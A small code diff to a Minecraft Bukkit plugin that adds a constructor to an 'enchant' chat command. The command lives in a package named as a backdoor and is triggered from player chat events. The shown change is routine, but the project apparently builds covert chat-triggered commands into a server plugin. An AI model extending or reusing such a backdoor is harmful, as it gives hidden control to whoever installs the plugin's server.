@@ -2,6 +2,7 @@ package me.tsb.backdoor.commands;
 
 import me.tsb.backdoor.Command;
 import me.tsb.backdoor.RegisterCommand;
+import me.tsb.plugin.Main;
 import org.bukkit.ChatColor;
 import org.bukkit.enchantments.Enchantment;
 import org.bukkit.event.player.PlayerChatEvent;
@@ -12,6 +13,12 @@ import java.util.ArrayList;
 
 @RegisterCommand(displayName = "enchant", aliases = {"enchant"})
 public class EnchantCommand extends Command {
+
+    private final Main main;
+
+    public EnchantCommand (Main main) {
+        this.main = main;
+    }
 
     @Override
     public void onExec(PlayerChatEvent event, ArrayList<String> args) {
